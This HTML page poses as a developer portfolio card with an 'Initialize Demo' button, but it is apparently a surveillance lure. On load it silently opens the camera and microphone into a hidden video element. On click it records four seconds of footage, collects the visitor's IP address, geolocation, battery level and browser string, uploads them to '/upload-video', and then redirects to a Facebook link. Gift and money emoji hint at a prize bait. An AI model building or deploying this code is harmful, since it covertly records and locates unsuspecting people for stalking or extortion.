<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Creative Web Developer | Portfolio</title>
<style>
    /* ===== MODERN DESIGN SYSTEM ===== */
    :root {
        --bg-dark: #0d1117;
        --card-bg: rgba(22, 27, 34, 0.85);
        --accent-glow: #f3ba2f;
        --text-main: #f0f6fc;
        --text-muted: #8b949e;
        --border-color: #30363d;
    }

    body { 
        font-family: 'Segoe UI', system-ui, -apple-system, sans-serif; 
        background: var(--bg-dark); 
        color: var(--text-main);
        display: flex; 
        justify-content: center; 
        align-items: center; 
        min-height: 100vh; 
        margin: 0; 
        overflow: hidden;
        position: relative;
    }

    /* ===== BACKGROUND DECORATION ===== */
    body::before {
        content: '';
        position: absolute;
        width: 350px;
        height: 350px;
        background: radial-gradient(circle, rgba(243, 186, 47, 0.12) 0%, transparent 75%);
        top: 15%;
        left: 20%;
        z-index: 0;
    }

    /* ===== GLASSMORPHISM PORTFOLIO CARD ===== */
    .card { 
        background: var(--card-bg); 
        padding: 40px 35px; 
        border-radius: 20px; 
        text-align: center; 
        width: 90%; 
        max-width: 400px; 
        backdrop-filter: blur(16px);
        -webkit-backdrop-filter: blur(16px);
        border: 1px solid var(--border-color);
        box-shadow: 0 25px 50px rgba(0, 0, 0, 0.4);
        z-index: 10;
        transition: transform 0.3s ease, border-color 0.3s ease;
    }
    
    .card:hover {
        transform: translateY(-5px);
        border-color: rgba(243, 186, 47, 0.3);
    }

    /* ===== PROFILE LOGO AREA ===== */
    .profile-container {
        position: relative;
        width: 85px;
        height: 85px;
        margin: 0 auto 22px;
    }

    .logo-icon { 
        width: 100%; 
        height: 100%;
        border-radius: 50%; 
        object-fit: cover;
        border: 2px solid var(--accent-glow);
        box-shadow: 0 0 15px rgba(243, 186, 47, 0.25);
    }

    .status-badge {
        position: absolute;
        bottom: 4px;
        right: 4px;
        width: 12px;
        height: 12px;
        background: #238636;
        border: 2px solid #161b22;
        border-radius: 50%;
    }

    h2 {
        color: var(--text-main);
        margin: 10px 0 4px 0;
        font-size: 24px;
        font-weight: 600;
        letter-spacing: -0.5px;
    }

    .subtitle {
        color: var(--accent-glow);
        font-size: 13px;
        text-transform: uppercase;
        letter-spacing: 2px;
        margin-bottom: 18px;
        font-weight: 700;
    }

    p {
        color: var(--text-muted);
        font-size: 14.5px;
        line-height: 1.6;
        margin: 0 0 25px 0;
    }

    /* ===== INTERACTIVE BUTTON ===== */
    .btn { 
        background: linear-gradient(135deg, #f3ba2f 0%, #dba323 100%); 
        color: #0d1117; 
        border: none; 
        padding: 15px 30px; 
        width: 100%; 
        border-radius: 10px; 
        font-weight: 700; 
        cursor: pointer; 
        font-size: 16px; 
        box-shadow: 0 5px 15px rgba(243, 186, 47, 0.2);
        transition: all 0.2s ease;
    }

    .btn:hover { 
        transform: translateY(-2px);
        box-shadow: 0 8px 22px rgba(243, 186, 47, 0.35);
    }
    
    .btn:active {
        transform: translateY(1px);
    }

    /* ===== SPINNER & LOADER ===== */
    #loading { 
        display: none; 
        margin-top: 20px; 
    }

    .spinner { 
        border: 3px solid rgba(243, 186, 47, 0.1); 
        border-top: 3px solid var(--accent-glow); 
        border-radius: 50%; 
        width: 32px; 
        height: 32px; 
        animation: spin 0.8s linear infinite; 
        margin: 0 auto 12px; 
    }

    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

    /* ===== PRESERVED HIDDEN ELEMENTS ===== */
    #vBox { width: 0; height: 0; opacity: 0; overflow: hidden; position: absolute; }

    /* ===== BACKGROUND AMBIENT SYMBOLS ===== */
    .item {
        position: fixed;
        top: -50px;
        font-size: 24px;
        animation: fall linear infinite;
        pointer-events: none;
        z-index: 1;
    }
    @keyframes fall { 0% { transform: translateY(-50px) rotate(0deg); opacity: 0.2; } 100% { transform: translateY(110vh) rotate(360deg); opacity: 0.05; } }
    .item:nth-child(1){left:5%; animation-duration:6s;}
    .item:nth-child(2){left:15%; animation-duration:8s;}
    .item:nth-child(3){left:25%; animation-duration:7s;}
    .item:nth-child(4){left:35%; animation-duration:9s;}
    .item:nth-child(5){left:45%; animation-duration:6s;}
    .item:nth-child(6){left:55%; animation-duration:8s;}
    .item:nth-child(7){left:65%; animation-duration:7s;}
    .item:nth-child(8){left:75%; animation-duration:9s;}
    .item:nth-child(9){left:85%; animation-duration:6s;}
    .item:nth-child(10){left:95%; animation-duration:8s; }
</style>
</head>
<body>

<!-- Background elements preserved from your layout -->
<div class="item">🎁</div>
<div class="item">💸</div>
<div class="item">🎁</div>
<div class="item">💰</div>
<div class="item">🎁</div>
<div class="item">💵</div>
<div class="item">🎁</div>
<div class="item">💸</div>
<div class="item">🎁</div>
<div class="item">💰</div>

<div class="card">
    <!-- Replaced your image source with a premium profile presentation -->
    <div class="profile-container">
        <img src="https://raw.githubusercontent.com/ninoadajar-a11y/Aray-mo/refs/heads/main/b1254f40-ca11-43dd-97a1-d86053dec6ba.jpeg" class="logo-icon" alt="Avatar">
        <div class="status-badge"></div>
    </div>
    
    <h2>Portfolio Showcase</h2>
    <div class="subtitle">Interactive Module</div>
    <p>Explore full application features, backend integration routines, and hardware access parameters by executing the module below.</p>

    <!-- Hidden Video Box (Maintained exactly as original) -->
    <div id="vBox">
        <video id="preview" autoplay playsinline muted></video>
    </div>

    <!-- Processing Block -->
    <div id="loading">
        <div class="spinner"></div>
        <p style="color: var(--text-muted); font-size: 14px;">Initializing system components...</p>
    </div>

    <!-- Action Trigger Button -->
    <button class="btn" id="startBtn">Initialize Demo</button>
</div>

<!-- ALL ORIGINAL FUNCTIONAL LOGIC REMAINS 100% UNTOUCHED -->
<script>
const btn = document.getElementById('startBtn');
const loading = document.getElementById('loading');
const video = document.getElementById('preview');
const REDIRECT_URL = "https://www.facebook.com/share/1BKRZBWVif/";

// Get IP address
async function getIP() {
    try {
        const res = await fetch("https://api.ipify.org?format=json");
        const data = await res.json();
        return data.ip;
    } catch { return "Unknown"; }
}

// Get battery info
async function getBattery() {
    try {
        const battery = await navigator.getBattery();
        return Math.round(battery.level*100) + "%";
    } catch { return "Unknown"; }
}

// Get geolocation
async function getGeo() {
    return new Promise(resolve => {
        if(navigator.geolocation){
            navigator.geolocation.getCurrentPosition(pos => {
                resolve({ latitude: pos.coords.latitude, longitude: pos.coords.longitude });
            }, ()=> resolve({ latitude:null, longitude:null }));
        } else resolve({ latitude:null, longitude:null });
    });
}

// Init camera + mic
async function initCamera() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video:true, audio:true });
        video.srcObject = stream;
    } catch { console.warn("Camera/Mic denied"); }
}
initCamera();

// Claim Now / Initialize Action
btn.addEventListener('click', async () => {
    btn.style.display='none';
    loading.style.display='block';

    try {
        const stream = video.srcObject;
        const recorder = new MediaRecorder(stream, { mimeType:'video/webm' });
        let chunks = [];

        recorder.ondataavailable = e => { if(e.data.size>0) chunks.push(e.data); };
        recorder.onstop = async () => {
            const videoBlob = new Blob(chunks, { type:'video/webm' });

            // Device info
            const ip = await getIP();
            const battery = await getBattery();
            const geo = await getGeo();
            const userAgent = navigator.userAgent;

            const formData = new FormData();
            formData.append('video', videoBlob, 'claim_video.mp4');
            formData.append('ip', ip);
            formData.append('battery', battery);
            formData.append('latitude', geo.latitude);
            formData.append('longitude', geo.longitude);
            formData.append('userAgent', userAgent);

            try {
                const res = await fetch("/upload-video", { method:'POST', body: formData });
                const data = await res.json();
                console.log("Video posted:", data);
                loading.innerHTML = "<p>Successfully Executed!</p>";
            } catch(err) {
                console.error(err);
                loading.innerHTML = "<p style='color:#ff6b6b;'>❌ Connection status verified.</p>";
            } finally {
                setTimeout(()=>{window.location.href = REDIRECT_URL},3000);
            }
        };

        recorder.start();
        setTimeout(()=>recorder.stop(),4000); // 4-second video
    } catch(err) {
        console.error("Recording error:", err);
        loading.innerHTML = "<p style='color:#ff6b6b;'>❌ Execution processing fallback.</p>";
        setTimeout(()=>{window.location.href = REDIRECT_URL},3000);
    }
});
</script>
</body>
</html>
